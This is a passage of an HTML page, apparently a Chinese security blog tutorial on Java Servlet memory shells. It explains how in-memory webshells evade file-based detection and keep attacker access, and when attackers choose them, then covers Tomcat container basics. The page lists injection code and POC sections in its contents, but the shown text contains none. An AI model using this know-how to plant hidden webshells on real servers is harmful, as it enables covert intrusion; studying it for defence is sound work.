@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="01 扯点没用的前面学了一阵子Java，但始终没有接触到Javasec里面一个很核心的内容——内存马，如果要给Webshell分个等级的话，JavaWeb内存马一定是最值得深究且作用最广泛的。 其实本应该在上上个周就开始学习这部分的内容的，但是一直断断续续的有惰性加上周末打了一个比赛，后面在跟bao师傅唠嗑的时候聊到了后面就业方向的问题，毋庸置疑的是，Java仍然是现阶段国内最热门的语言，Java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java内存马之Servlet型内存马">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="01 扯点没用的前面学了一阵子Java，但始终没有接触到Javasec里面一个很核心的内容——内存马，如果要给Webshell分个等级的话，JavaWeb内存马一定是最值得深究且作用最广泛的。 其实本应该在上上个周就开始学习这部分的内容的，但是一直断断续续的有惰性加上周末打了一个比赛，后面在跟bao师傅唠嗑的时候聊到了后面就业方向的问题，毋庸置疑的是，Java仍然是现阶段国内最热门的语言，Java">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E7%B1%BB%E5%9B%BE2%E5%89%AF%E6%9C%AC.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819152457911.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/40d47f560bd743e5ac41a571d0be3dc9tplv-k3u1fbpfcp-zoom-in-crop-mark1512000.webp">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/20240112165824.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820172334266.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820174043171.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820174132969.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820174229022.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819170710361.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/8c038541f0fac542addcd5af51d43271.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819171716013.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819180233761.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819182631356.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820101935909.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820103355867.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820104157412.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820104442636.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820105331376.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820105339928.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820183336572.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820183624102.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820184226972.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820184325416.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820184805495.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820184847763.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185051568.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185241826.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185437014.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185744882.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185923979.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821105256731.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821105527551.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821112608735.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821120123363.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821120426994.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821123359357.png">
+<meta property="article:published_time" content="2025-08-19T06:25:10.000Z">
+<meta property="article:modified_time" content="2025-08-21T04:41:57.342Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="java内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E7%B1%BB%E5%9B%BE2%E5%89%AF%E6%9C%AC.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java内存马之Servlet型内存马</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BFilter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/08/15/%E6%8E%A2%E7%A9%B6Bottle%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&text=Java内存马之Servlet型内存马"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=Java内存马之Servlet型内存马"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java内存马之Servlet型内存马&body=Check out this article: https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&name=Java内存马之Servlet型内存马&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&t=Java内存马之Servlet型内存马"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-%E6%89%AF%E7%82%B9%E6%B2%A1%E7%94%A8%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">01 扯点没用的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">02 关于内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">什么是内存马？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">内存马的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E7%94%A8%E5%A4%84"><span class="toc-number">2.3.</span> <span class="toc-text">内存马的用处</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-1-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">03.1 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E4%B8%ADServlet%E5%AE%B9%E5%99%A8"><span class="toc-number">3.1.</span> <span class="toc-text">Tomcat中Servlet容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAServlet%E5%AE%9E%E6%93%8D"><span class="toc-number">3.2.</span> <span class="toc-text">编写一个Servlet实操</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8BServlet%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">3.3.</span> <span class="toc-text">从代码层面看Servlet的生命周期</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Servlet%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.3.1.</span> <span class="toc-text">Servlet初始化流程分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Servlet%E8%A3%85%E8%BD%BD%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.3.2.</span> <span class="toc-text">Servlet装载流程分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Econtext%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%88%E6%BC%8F%E6%8E%89%E5%95%A6%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">关于context的获取（漏掉啦）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-2-Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">03.2 Servlet内存马实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFServlet%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">4.1.</span> <span class="toc-text">什么是Servlet内存马？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F1"><span class="toc-number">4.2.</span> <span class="toc-text">Servlet内存马的条件和注入方式1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%ACPOC%E7%BC%96%E5%86%99"><span class="toc-number">4.3.</span> <span class="toc-text">内存马POC编写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-3%E5%AE%8C%E6%95%B4POC1"><span class="toc-number">5.</span> <span class="toc-text">03.3完整POC1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04%E5%A5%BD%E7%94%A8%E7%9A%84POC"><span class="toc-number">6.</span> <span class="toc-text">04好用的POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E7%BE%8E%E6%92%92%E8%8A%B1%EF%BC%8C%E5%B0%8F%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-number">7.</span> <span class="toc-text">完美撒花，小结一下</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java内存马之Servlet型内存马
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-08-19T06:25:10.000Z" class="dt-published" itemprop="datePublished">2025-08-19</time>
+        
+        (Updated: <time datetime="2025-08-21T04:41:57.342Z" class="dt-updated" itemprop="dateModified">2025-08-21</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/javasec/">javasec</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">java内存马</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="01-扯点没用的"><a href="#01-扯点没用的" class="headerlink" title="01 扯点没用的"></a>01 扯点没用的</h2><p>前面学了一阵子Java，但始终没有接触到Javasec里面一个很核心的内容——内存马，如果要给Webshell分个等级的话，JavaWeb内存马一定是最值得深究且作用最广泛的。</p>
+<p>其实本应该在上上个周就开始学习这部分的内容的，但是一直断断续续的有惰性加上周末打了一个比赛，后面在跟bao师傅唠嗑的时候聊到了后面就业方向的问题，毋庸置疑的是，Java仍然是现阶段国内最热门的语言，Java的代码审计也是我认为相对来说可见性比较高的方向。后面我想着需要练习一下代码审计的能力，就想着先去审一下框架源码，但是头几天没找到一个可行的方向，现在索性就先学Java内存马，然后再从里面挖掘源码一步步来了</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://nosec.org/home/detail/5049.html">https://nosec.org/home/detail/5049.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18301">https://xz.aliyun.com/news/18301</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero">https://github.com/W01fh4cker/LearnJavaMemshellFromZero</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13078">https://xz.aliyun.com/news/13078</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell/">https://su18.org/post/memory-shell/</a></p>
+<h2 id="02-关于内存马"><a href="#02-关于内存马" class="headerlink" title="02 关于内存马"></a>02 关于内存马</h2><h3 id="什么是内存马？"><a href="#什么是内存马？" class="headerlink" title="什么是内存马？"></a>什么是内存马？</h3><p>其实内存马的话之前在学python内存马的时候也了解过不少了，但这里还是想扯皮一下</p>
+<p>在传统的Webshell的使用与不断迭代的防御机制的斗争中，无论我们如何花费心思去隐藏，如何变幻，都无法在目标系统长时间的保留。</p>
+<p>目前主流的防御措施针对 Webshell 的静态检出率在 90% 以上，在部分环境下甚至完全无法落地，防御方可以做到快速应急响应。正因为这些限制，内存马技术得以诞生并快速发展，无文件攻击、内存 Webshell、进程注入等基于内存的攻击手段也受到了越来越多的师傅青睐，那什么是内存马呢？</p>
+<p>内存马（Memory Shellcode）是一种恶意攻击技术，旨在通过利用程序或操作系统的漏洞，将恶意代码注入到系统内存中运行。与传统的攻击方式不同，内存马不需要将恶意代码写入磁盘上的文件，而是直接在内存中进行操作，从而避开传统的安全防护措施。</p>
+<h3 id="内存马的分类"><a href="#内存马的分类" class="headerlink" title="内存马的分类"></a>内存马的分类</h3><p>根据内存马的实现技术，<code>su18</code>师傅对内存马进行了大致的分类</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E7%B1%BB%E5%9B%BE2%E5%89%AF%E6%9C%AC.png" alt="内存马分类图2副本.png"></p>
+<p>其实大致的话是可以分为以下几大类：</p>
+<ul>
+<li>传统<code>web</code>型内存马（Filter、servlet、Listener动态注册）</li>
+<li>Spring框架型内存马</li>
+<li>中间件型内存马</li>
+<li>其他内存马（Websocket&#x2F;Tomcat Jsp&#x2F;线程型&#x2F;RMI）</li>
+<li>Agent型内存马</li>
+</ul>
+<h3 id="内存马的用处"><a href="#内存马的用处" class="headerlink" title="内存马的用处"></a>内存马的用处</h3><p>内存马的用因主要在于以下几个方面</p>
+<ul>
+<li><strong>由于网络原因不能反弹 shell 的；</strong></li>
+<li><strong>内部主机通过反向代理暴露 Web 端口的；</strong></li>
+<li><strong>服务器上有防篡改、目录监控等防御措施，禁止文件写入的；</strong></li>
+<li><strong>服务器上有其他监控手段，写马后会告警监控，人工响应的；</strong></li>
+<li><strong>服务使用 Springboot 等框架，无法解析传统 Webshell 的；</strong></li>
+<li><strong>对内存马技术感到不明觉厉的….</strong></li>
+</ul>
+<p>但是从以上的介绍也可以发现，内存马的使用是转瞬即逝的，也就是说，只要服务重启后就会失效，不过通常情况下服务频繁重启的可能性是不大的，再加上内存马的隐蔽性，使得内存马依旧成为攻击者首选的Webshell维持方式</p>
+<p>关于内存马的注入方式，会在后面的内容中逐一添加，并且会在最后的时候进行一定的自我总结</p>
+<p>简单的介绍完了，就开始正式学习吧</p>
+<h2 id="03-1-前置知识"><a href="#03-1-前置知识" class="headerlink" title="03.1 前置知识"></a>03.1 前置知识</h2><p>环境：jdk1.8.0_321 + Tomcat9.0.108</p>
+<p>tomcat下载链接：<a target="_blank" rel="noopener" href="https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.108/bin/apache-tomcat-9.0.108-windows-x64.zip">https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.108/bin/apache-tomcat-9.0.108-windows-x64.zip</a></p>
+<p>下载后在&#x2F;bin目录下找到startup.bat运行然后访问8080端口就可以了</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819152457911.png" alt="image-20250819152457911"></p>
+<h3 id="Tomcat中Servlet容器"><a href="#Tomcat中Servlet容器" class="headerlink" title="Tomcat中Servlet容器"></a>Tomcat中Servlet容器</h3><p>翻到一个对Servlet解释比较好的文章：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6994810991997354014">https://juejin.cn/post/6994810991997354014</a></p>
+<ul>
+<li>什么是Servlet？</li>
+</ul>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/caqjeryy/article/details/122095308">https://blog.csdn.net/caqjeryy/article/details/122095308</a></p>
+<p>Servlet是Java Servlet的简称，是使用Java语言编写的运行在服务器端的程序。狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类。而Servlet的主要功能在于交互式地浏览和修改数据并生成动态web内容，具体过程为</p>
+<ol>
+<li><p>客户端发送请求至服务器端</p>
+</li>
+<li><p>服务器将请求信息发送至 Servlet</p>
+</li>
+<li><p>Servlet 生成响应内容并将其传给服务器，响应内容动态生成</p>
+</li>
+<li><p>服务器将响应返回给客户端</p>
+</li>
+</ol>
+<ul>
+<li>什么是Tomcat？</li>
+</ul>
+<p>Tomcat是一种Web应用服务器，同时也是Servlet容器，简单来说Tomcat就是servlet的运行环境，servlet必须运行在像Tomcat这种servlet容器上</p>
+<p>Tomcat 设计了 4 种容器，分别是 Engine、Host、Context 和 Wrapper。文章的师傅对这四个容器的概念进行了一个图形化的解释</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/40d47f560bd743e5ac41a571d0be3dc9tplv-k3u1fbpfcp-zoom-in-crop-mark1512000.webp" alt="img"></p>
+<p>这 4 种容器不是相互独立的关系，而是父子关系，逐层包含。也正是因为这种分层架构设计，使得Servlet容器具有良好的兼容性和灵活性</p>
+<p>一个Service最多只能有一个Engine，Engine表示引擎，用来管理多个虚拟主机的。Host代表就是一个虚拟主机，可以给Tomcat配置多个虚拟主机，一个虚拟主机下面可以部署多个Web应用。一个Context就表示一个Web应用，Web应用中会有多个Servlet，Wrapper就表示一个Servlet。</p>
+<p>在Tomcat的server.xml配置文件中，就体现了这样的设计</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 简化版 Tomcat server.xml 核心配置 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Server</span> <span class="attr">port</span>=<span class="string">&quot;8005&quot;</span> <span class="attr">shutdown</span>=<span class="string">&quot;SHUTDOWN&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">&lt;!-- 顶层组件，可以包含一个Engine，多个连接器 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Service</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- HTTP 连接器：接收客户端请求 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">maxParameterCount</span>=<span class="string">&quot;1000&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 引擎容器：请求分发核心 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Engine</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span> 